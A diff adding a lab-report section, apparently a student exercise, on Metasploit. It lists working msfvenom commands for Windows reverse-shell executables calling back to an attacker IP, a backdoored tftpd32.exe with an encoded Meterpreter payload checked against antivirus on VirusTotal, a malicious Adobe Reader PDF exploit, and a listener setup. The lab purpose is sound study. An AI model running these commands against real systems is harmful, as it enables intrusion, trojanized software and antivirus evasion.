@@ -186,3 +186,149 @@ if (strcmp(buffer, string) == 0) {
 }
 ```
 Ensures that authentication only succeeds when the **full username and password match exactly**.
+
+# 4.2 Exploit Frameworks
+I used Kali Linux, which already contains **Metasploit**. The framework version was verified with `msfconsole -v`.
+
+Metasploit previously used two tools for payload generation:
+- `msfpayload`
+- `msfencode`
+
+But since 2015 these tools have been replaced by `msfvenom`, which combinees payload generation and encoding functionality.
+
+## Reverse TCP Windows PE Payload
+The correct `msfvenom` command equivalent to the old `msfpayload` command is:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.182.136 LPORT=31337 -f exe -o msf_shell_rev_tcp1.exe
+```
+Where:
+- windows/shell_reverse_tcp - reverse shell payload
+- LHOST - attacker IP address
+- LPORT - listening port
+- -f exe - output format
+- -o - output file
+
+The generated executable file contained the full payload code, the file was then uploaded to **VirusTotal** to analyze how many antivirus engines detected it.
+[BILD HÄR]
+
+## Staged Reverse TCP Payload
+Generating a staged payload, with the correct command:
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.182.136 LPORT=31337 -f exe -o msf_shell_rev_tcp2.exe
+```
+In this case, the payload does not contain the full shell code. Instead, a small stager connects back to the attacker machine and downloads the remaining payload from memory.
+
+The generated file was once again uploaded to **VirusTotal**.
+
+[BILD HÄR]
+
+## Difference between payload types
+
+The difference between the two payload types are:
+
+**Windows/shell_reverse_tcp**
+- Non-staged payload
+- Contains the entire shellcode in the executable
+- Larger payload size
+- Easier for antivirus systems to detect
+
+**windows/shell/reverse_tcp**
+- Staged payload
+- Small initial stager connects back to attacker
+- Remaining payload is downloaded in memory
+- Smaller footprint and sometimes harder for antivirus to detect
+
+## Encoded Meterpreter Payload Injection
+The next task required creating an encoded Meterpreter reverse TCP Payload and injecting it into an executable file.
+
+The correct command with `msfvenom`:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.182.136 LPORT=31337 -x tftpd32.exe -k -e x86/shikata_ga_nai -i 3 -f exe -o tftpd32_bdoor.exe
+```
+
+Where:
+- -x tftpd32.exe - Inject payload into an existing executable
+- -k - keep the original program functionality
+- -e x86/shikata_ga_nai - encoding method
+- -i 3 - number of encoding iterations
+
+The encoded executable was scanned with **VirusTotal**.
+
+[BILD HÄR]
+
+## Meterpreter Payload Options
+
+**windows/meterpreter/reverse_tcp**
+- Creates a reverse TCP connection from the victim to the attacker. One of the most commonly used Meterpreter payloads.
+
+**windows/meterpreter/bind_tcp**
+- Opens a listening port on the victim machine that the attacker can connect to.
+
+**windows/meterpreter/reverse_http**
+- Establishes a connection back to the attacker using HTTP traffic, which can bypass some firewalls.
+
+**windows/meterpreter/reverse_https**
+- Similar to reverse_http but encrypts communication using HTTPS.
+
+**windows/meterpreter_reverse_tcp_dns**
+- Uses DNS traffic for command and control communication
+
+**windows/x64/meterpreter/reverse_tcp**
+- 64-bit version of the reverse TCP Meterpreter payload.
+
+**windows/x64/meterpreter/reverse_https**
+- 64-bit version Meterpreter payload communicating over HTTPS.
+
+**windows/meterpreter/reverse_tcp_allports**
+- Attempts to connect back using multiple ports
+
+**windows/meterpreter/reverse_tcp_uuid**
+- Includes a unique identifier used by Metasploit to track sessions
+
+**windows/meterpreter_reverse_http_proxy**
+- Allow connections through proxy servers
+
+**windows/meterpreter/reverse_winhttps**
+- Uses the Windows WinHTTP API for encrypted communication
+
+## 4.2.2 Connect to the Exploit and PDF Exploits
+
+To display several exploit modules targeting vulnerabilites in **Adobe Reader**, I used `search platform:"Windows" type:exploit name:adobe`
+
+One of the available exploits was `exploit/windows/fileformat/adobe_cooltype_sing`.
+
+I loaded the exploit module by using `use exploit/windows/fileformat/adobe_cooltype_sing`, and checked the configurations with `show options`.
+
+The exploit was configured with a Meterpreter reverse TCP payload:
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <IP_ADDRESS>
+set LPORT <LISTENING_PORT>
+```
+The exploit was executed using `exploit`, and Metasploit generated a malicious PDF file `msf.pdf`, the file was stored in the Metasploit
+directory: `/home/kali/.msf4/local/msf.pdf`.
+
+The PDF was uploaded to **VirusTotal**.
+[BILD HÄR].
+
+To receive the reverse connection from the victim system, a handler was started in Metasploit using:
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <IP_ADDRESS>
+set LPORT <LISTENING_PORT>
+exploit
+```
+This command starts a listener waiting for incoming Meterpreter sessions.
+
+## Exploit Execution
+
+The generated PDF was opened on the target system using **Adobe Acrobat Reader 9.3.0**. When the file was opened, the exploit attempts to trigger vulnerability and execute the embedded payload.
+
+Meterpreter commands:
+```
+sysinfo
+getuid
+ps
+```
+These commands provide system information, the current user identity, and a list of the running processes.
